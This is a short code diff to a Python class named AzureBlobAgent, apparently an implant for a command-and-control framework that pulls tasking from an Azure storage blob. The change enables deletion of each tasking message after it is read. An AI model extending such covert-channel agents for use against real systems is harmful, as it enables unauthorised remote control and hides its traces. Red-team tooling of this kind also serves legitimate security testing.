@@ -152,7 +152,7 @@ class AzureBlobAgent:
             decoded = base64.b64decode(data).decode()
             data = json.loads(decoded[36:])  # Skip UUID prefix
             print(f"[*] Received sta message: {decoded}")
-            #self.delete_blob("sta/message.blob")
+            self.delete_blob("sta/message.blob")
             return data
         except Exception as e:
             print(f"[!] Failed to parse tasking: {e}")
